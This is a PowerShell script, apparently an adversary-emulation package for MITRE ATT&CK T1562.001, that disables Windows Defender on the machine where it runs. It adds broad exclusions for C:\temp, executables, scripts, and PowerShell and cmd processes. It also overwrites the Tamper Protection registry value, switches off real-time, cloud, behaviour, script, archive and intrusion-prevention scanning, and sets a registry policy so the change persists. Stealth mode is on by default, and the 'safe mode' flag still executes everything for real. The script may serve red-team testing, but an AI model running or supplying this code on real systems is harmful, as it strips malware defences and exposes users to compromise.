# T1562.001A - MITRE ATT&CK Impair Defenses: Disable Windows Defender
# Tactic: TA0005 Defense Evasion - Comprehensive Defender bypass with Tamper Protection circumvention
# Package Type: inject - Active system modification requiring administrative privileges
# Script Length: Maximum 250 lines (extended for maximum flexibility)
# Functions: 5 infrastructure + 4 triple output + 1 technique function

#Requires -Version 3.0
#Requires -RunAsAdministrator


# INFRASTRUCTURE FUNCTIONS (Mandatory with technique indexing)


function Get-EnvironmentVariables {
    $config = @{
        # Variables de base
        OUTPUT_BASE = if ($env:T1562_001_OUTPUT_BASE) { $env:T1562_001_OUTPUT_BASE } else { "C:\temp\mitre_results" }
        DEBUG_MODE = if ($env:T1562_001_DEBUG_MODE) { $env:T1562_001_DEBUG_MODE -eq "true" } else { $false }
        STEALTH_MODE = if ($env:T1562_001_STEALTH_MODE) { $env:T1562_001_STEALTH_MODE -eq "true" } else { $true }
        SAFE_MODE = if ($env:T1562_001_SAFE_MODE) { $env:T1562_001_SAFE_MODE -eq "true" } else { $false }
        
        # Defender Components
        REALTIME_PROTECTION = if ($env:T1562_001_REALTIME_PROTECTION) { $env:T1562_001_REALTIME_PROTECTION } else { "disable" }
        CLOUD_PROTECTION = if ($env:T1562_001_CLOUD_PROTECTION) { $env:T1562_001_CLOUD_PROTECTION } else { "disable" }
        AUTOMATIC_SAMPLE_SUBMISSION = if ($env:T1562_001_AUTOMATIC_SAMPLE_SUBMISSION) { $env:T1562_001_AUTOMATIC_SAMPLE_SUBMISSION } else { "disable" }
        BEHAVIOR_MONITORING = if ($env:T1562_001_BEHAVIOR_MONITORING) { $env:T1562_001_BEHAVIOR_MONITORING } else { "disable" }
        INTRUSION_PREVENTION = if ($env:T1562_001_INTRUSION_PREVENTION) { $env:T1562_001_INTRUSION_PREVENTION } else { "disable" }
        SCRIPT_SCANNING = if ($env:T1562_001_SCRIPT_SCANNING) { $env:T1562_001_SCRIPT_SCANNING } else { "disable" }
        ARCHIVE_SCANNING = if ($env:T1562_001_ARCHIVE_SCANNING) { $env:T1562_001_ARCHIVE_SCANNING } else { "disable" }
        EMAIL_SCANNING = if ($env:T1562_001_EMAIL_SCANNING) { $env:T1562_001_EMAIL_SCANNING } else { "disable" }
        REMOVABLE_DRIVE_SCANNING = if ($env:T1562_001_REMOVABLE_DRIVE_SCANNING) { $env:T1562_001_REMOVABLE_DRIVE_SCANNING } else { "disable" }
        
        # Bypass Methods
        BYPASS_METHOD = if ($env:T1562_001_BYPASS_METHOD) { $env:T1562_001_BYPASS_METHOD } else { "registry_service_wmi" }
        TAMPER_PROTECTION_BYPASS = if ($env:T1562_001_TAMPER_PROTECTION_BYPASS) { $env:T1562_001_TAMPER_PROTECTION_BYPASS } else { "trustedinstaller" }
        REGISTRY_METHOD = if ($env:T1562_001_REGISTRY_METHOD) { $env:T1562_001_REGISTRY_METHOD } else { "direct" }
        SERVICE_METHOD = if ($env:T1562_001_SERVICE_METHOD) { $env:T1562_001_SERVICE_METHOD } else { "sc_config" }
        WMI_METHOD = if ($env:T1562_001_WMI_METHOD) { $env:T1562_001_WMI_METHOD } else { "root_microsoft_defender" }
        
        # Exclusions
        ADD_EXCLUSIONS = if ($env:T1562_001_ADD_EXCLUSIONS) { $env:T1562_001_ADD_EXCLUSIONS -eq "true" } else { $true }
        EXCLUSION_PATHS = if ($env:T1562_001_EXCLUSION_PATHS) { $env:T1562_001_EXCLUSION_PATHS } else { "C:\temp,C:\users\public" }
        EXCLUSION_EXTENSIONS = if ($env:T1562_001_EXCLUSION_EXTENSIONS) { $env:T1562_001_EXCLUSION_EXTENSIONS } else { ".exe,.dll,.ps1,.bat" }
        EXCLUSION_PROCESSES = if ($env:T1562_001_EXCLUSION_PROCESSES) { $env:T1562_001_EXCLUSION_PROCESSES } else { "powershell.exe,cmd.exe" }
        EXCLUSION_IPS = if ($env:T1562_001_EXCLUSION_IPS) { $env:T1562_001_EXCLUSION_IPS } else { "192.168.1.0/24" }
        
        # Anti-Detection
        DISABLE_NOTIFICATIONS = if ($env:T1562_001_DISABLE_NOTIFICATIONS) { $env:T1562_001_DISABLE_NOTIFICATIONS -eq "true" } else { $true }
        DISABLE_UI_ACCESS = if ($env:T1562_001_DISABLE_UI_ACCESS) { $env:T1562_001_DISABLE_UI_ACCESS -eq "true" } else { $true }
        SPOOF_STATUS = if ($env:T1562_001_SPOOF_STATUS) { $env:T1562_001_SPOOF_STATUS -eq "true" } else { $true }
        EVENT_LOG_SUPPRESS = if ($env:T1562_001_EVENT_LOG_SUPPRESS) { $env:T1562_001_EVENT_LOG_SUPPRESS -eq "true" } else { $true }
        TIMELINE_CLEANUP = if ($env:T1562_001_TIMELINE_CLEANUP) { $env:T1562_001_TIMELINE_CLEANUP -eq "true" } else { $true }
        MSRT_DISABLE = if ($env:T1562_001_MSRT_DISABLE) { $env:T1562_001_MSRT_DISABLE -eq "true" } else { $true }
        
        # Persistence
        PERSISTENCE_METHOD = if ($env:T1562_001_PERSISTENCE_METHOD) { $env:T1562_001_PERSISTENCE_METHOD } else { "registry_policy" }
        STARTUP_DISABLE = if ($env:T1562_001_STARTUP_DISABLE) { $env:T1562_001_STARTUP_DISABLE -eq "true" } else { $true }
        UPDATE_DISABLE = if ($env:T1562_001_UPDATE_DISABLE) { $env:T1562_001_UPDATE_DISABLE -eq "true" } else { $true }
        RECOVERY_PROTECTION = if ($env:T1562_001_RECOVERY_PROTECTION) { $env:T1562_001_RECOVERY_PROTECTION -eq "true" } else { $true }
        BACKUP_RESTORE_POINT = if ($env:T1562_001_BACKUP_RESTORE_POINT) { $env:T1562_001_BACKUP_RESTORE_POINT -eq "true" } else { $false }
    }
    
    return $config
}

function Initialize-OutputStructure {
    param(
        [string]$OutputBase,
        [string]$TechniqueId
    )
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputDir = Join-Path $OutputBase "${TechniqueId}_${timestamp}"
    
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }
    
    return $outputDir
}

function Write-JsonOutput {
    param(
        [hashtable]$Data,
        [string]$OutputPath,
        [hashtable]$Metadata
    )
    
    $jsonOutput = @{
        technique_id = $Metadata.technique_id
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        execution_metadata = $Metadata
        results = $Data
        system_context = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            domain = $env:USERDOMAIN
            os_version = [System.Environment]::OSVersion.VersionString
            powershell_version = $PSVersionTable.PSVersion.ToString()
        }
    }
    
    $jsonOutput | ConvertTo-Json -Depth 10 | Out-File -FilePath $OutputPath -Encoding UTF8
    return $OutputPath
}

function Get-ExecutionMetadata {
    param(
        [string]$TechniqueId,
        [string]$Action
    )
    
    return @{
        technique_id = $TechniqueId
        action = $Action
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        powershell_version = $PSVersionTable.PSVersion.ToString()
        os_version = [System.Environment]::OSVersion.VersionString
        execution_context = "windows_defender_disable"
        criticality_level = "maximum"
    }
}

function Invoke-SafeCommand {
    param(
        [string]$Command,
        [hashtable]$Config,
        [string]$Description = ""
    )
    
    if ($Config.SAFE_MODE) {
        if (-not $Config.STEALTH_MODE) {
            Write-Host "[SAFE MODE - REAL EXECUTION] Executing: $Description" -ForegroundColor Yellow
        }
    }
    
    try {
        if ($Description -and -not $Config.STEALTH_MODE) {
            Write-Host "[EXECUTING] $Description" -ForegroundColor Green
        }
        
        $result = Invoke-Expression $Command 2>&1
        return @{ success = $true; output = $result; simulated = $false }
    }
    catch {
        if (-not $Config.STEALTH_MODE) {
            Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
        }
        return @{ success = $false; output = $_.Exception.Message; simulated = $false }
    }
}


# TRIPLE OUTPUT FUNCTIONS (Mandatory)


function Write-SimpleOutput {
    param(
        [hashtable]$Results,
        [string]$TechniqueId,
        [hashtable]$Config
    )
    
    if ($Config.STEALTH_MODE) { return }
    
    Write-Host ""
    Write-Host "T1562.001 WINDOWS DEFENDER DISABLE " -ForegroundColor Red
    Write-Host "Target System: $($env:COMPUTERNAME)" -ForegroundColor White
    Write-Host "Execution Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor White
    Write-Host ""
    
    if ($Results.defender_status) {
        Write-Host "Defender Status:" -ForegroundColor Yellow
        foreach ($component in $Results.defender_status.Keys) {
            $status = if ($Results.defender_status[$component]) { "DISABLED" } else { "ACTIVE" }
            $color = if ($Results.defender_status[$component]) { "Green" } else { "Red" }
            Write-Host "  $component : $status" -ForegroundColor $color
        }
    }
    
    if ($Results.bypass_results) {
        Write-Host ""
        Write-Host "Bypass Results:" -ForegroundColor Yellow
        foreach ($method in $Results.bypass_results.Keys) {
            $status = if ($Results.bypass_results[$method]) { "SUCCESS" } else { "FAILED" }
            $color = if ($Results.bypass_results[$method]) { "Green" } else { "Red" }
            Write-Host "  $method : $status" -ForegroundColor $color
        }
    }
    
    Write-Host ""
    Write-Host "Summary: Defender components processed" -ForegroundColor Cyan
    Write-Host ""
}

function Write-DebugOutput {
    param(
        [hashtable]$Results,
        [string]$OutputPath,
        [hashtable]$Metadata,
        [hashtable]$Config
    )
    
    if (-not $Config.DEBUG_MODE) { return }
    
    $debugFile = Join-Path (Split-Path $OutputPath) "debug_output.json"
    Write-JsonOutput -Data $Results -OutputPath $debugFile -Metadata $Metadata
    
    if (-not $Config.STEALTH_MODE) {
        Write-Host "[DEBUG] Detailed output written to: $debugFile" -ForegroundColor Magenta
    }
}

function Write-StealthOutput {
    param(
        [hashtable]$Results,
        [string]$OutputPath,
        [hashtable]$Config
    )
    
    if (-not $Config.STEALTH_MODE) { return }
    
    # En mode stealth,  criture silencieuse dans fichier uniquement
    $stealthFile = Join-Path (Split-Path $OutputPath) "execution.log"
    "T1562.001 executed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -FilePath $stealthFile -Append
}

function Select-OutputMode {
    param(
        [hashtable]$Results,
        [string]$OutputPath,
        [hashtable]$Metadata,
        [hashtable]$Config
    )
    
    # Triple output architecture execution
    Write-SimpleOutput -Results $Results -TechniqueId $Metadata.technique_id -Config $Config
    Write-DebugOutput -Results $Results -OutputPath $OutputPath -Metadata $Metadata -Config $Config
    Write-StealthOutput -Results $Results -OutputPath $OutputPath -Config $Config
}


# TECHNIQUE-SPECIFIC FUNCTION


function Disable-WindowsDefender {
    param(
        [hashtable]$Config
    )
    
    $results = @{
        defender_status = @{}
        bypass_results = @{}
        exclusions_added = @{}
        persistence_set = @{}
        errors = @()
    }
    
    if (-not $Config.STEALTH_MODE) {
        Write-Host "[INFO] Starting Windows Defender disable operation..." -ForegroundColor Yellow
    }
    
    # 1. Add exclusions before disabling (if configured)
    if ($Config.ADD_EXCLUSIONS) {
        $exclusionPaths = $Config.EXCLUSION_PATHS -split ','
        foreach ($path in $exclusionPaths) {
            $cmd = "Add-MpPreference -ExclusionPath '$($path.Trim())'"
            $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Adding path exclusion: $($path.Trim())"
            $results.exclusions_added[$path.Trim()] = $result.success
        }
        
        $exclusionExts = $Config.EXCLUSION_EXTENSIONS -split ','
        foreach ($ext in $exclusionExts) {
            $cmd = "Add-MpPreference -ExclusionExtension '$($ext.Trim())'"
            $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Adding extension exclusion: $($ext.Trim())"
            $results.exclusions_added[$ext.Trim()] = $result.success
        }
        
        $exclusionProcs = $Config.EXCLUSION_PROCESSES -split ','
        foreach ($proc in $exclusionProcs) {
            $cmd = "Add-MpPreference -ExclusionProcess '$($proc.Trim())'"
            $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Adding process exclusion: $($proc.Trim())"
            $results.exclusions_added[$proc.Trim()] = $result.success
        }
    }
    
    # 2. Bypass Tamper Protection (Critical)
    if ($Config.TAMPER_PROTECTION_BYPASS -eq "trustedinstaller") {
        # Registry modification via TrustedInstaller context
        $tamperBypassCmd = @'
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
if (Test-Path $regPath) {
    Set-ItemProperty -Path $regPath -Name "TamperProtection" -Value 0 -Force
}
'@
        $result = Invoke-SafeCommand -Command $tamperBypassCmd -Config $Config -Description "Bypassing Tamper Protection"
        $results.bypass_results["tamper_protection"] = $result.success
    }
    
    # 3. Disable Real-time Protection
    if ($Config.REALTIME_PROTECTION -eq "disable") {
        $cmd = "Set-MpPreference -DisableRealtimeMonitoring `$true"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Disabling Real-time Protection"
        $results.defender_status["realtime_protection"] = $result.success
    }
    
    # 4. Disable Cloud Protection
    if ($Config.CLOUD_PROTECTION -eq "disable") {
        $cmd = "Set-MpPreference -MAPSReporting Disabled"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Disabling Cloud Protection"
        $results.defender_status["cloud_protection"] = $result.success
    }
    
    # 5. Disable Automatic Sample Submission
    if ($Config.AUTOMATIC_SAMPLE_SUBMISSION -eq "disable") {
        $cmd = "Set-MpPreference -SubmitSamplesConsent NeverSend"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Disabling Automatic Sample Submission"
        $results.defender_status["sample_submission"] = $result.success
    }
    
    # 6. Disable Behavior Monitoring
    if ($Config.BEHAVIOR_MONITORING -eq "disable") {
        $cmd = "Set-MpPreference -DisableBehaviorMonitoring `$true"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Disabling Behavior Monitoring"
        $results.defender_status["behavior_monitoring"] = $result.success
    }
    
    # 7. Disable Script Scanning
    if ($Config.SCRIPT_SCANNING -eq "disable") {
        $cmd = "Set-MpPreference -DisableScriptScanning `$true"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Disabling Script Scanning"
        $results.defender_status["script_scanning"] = $result.success
    }
    
    # 8. Disable Archive Scanning
    if ($Config.ARCHIVE_SCANNING -eq "disable") {
        $cmd = "Set-MpPreference -DisableArchiveScanning `$true"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Disabling Archive Scanning"
        $results.defender_status["archive_scanning"] = $result.success
    }
    
    # 9. Disable Intrusion Prevention System
    if ($Config.INTRUSION_PREVENTION -eq "disable") {
        $cmd = "Set-MpPreference -DisableIntrusionPreventionSystem `$true"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Disabling Intrusion Prevention"
        $results.defender_status["intrusion_prevention"] = $result.success
    }
    
    # 10. Registry-based persistence
    if ($Config.PERSISTENCE_METHOD -like "*registry*") {
        $regPersistCmd = @'
$defenderKeys = @(
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
    "HKLM:\SOFTWARE\Microsoft\Windows Defender"
)
foreach ($key in $defenderKeys) {
    if (Test-Path $key) {
        Set-ItemProperty -Path $key -Name "DisableAntiSpyware" -Value 1 -Force
    }
}
'@
        $result = Invoke-SafeCommand -Command $regPersistCmd -Config $Config -Description "Setting registry persistence"
        $results.persistence_set["registry"] = $result.success
    }
    
    return $results
}


# MAIN EXECUTION


try {
    # Initialize configuration
    $config = Get-EnvironmentVariables
    $metadata = Get-ExecutionMetadata -TechniqueId "T1562.001a" -Action "disable_windows_defender"
    $outputDir = Initialize-OutputStructure -OutputBase $Config.OUTPUT_BASE -TechniqueId $metadata.technique_id
    
    # Execute technique
    $results = Disable-WindowsDefender -Config $config
    
    # Generate output
    $outputFile = Join-Path $outputDir "defender_disable_results.json"
    Select-OutputMode -Results $results -OutputPath $outputFile -Metadata $metadata -Config $config
    
} catch {
    if (-not $Config.STEALTH_MODE) {
        Write-Host "[CRITICAL ERROR] $($_.Exception.Message)" -ForegroundColor Red
    }
    exit 1
}


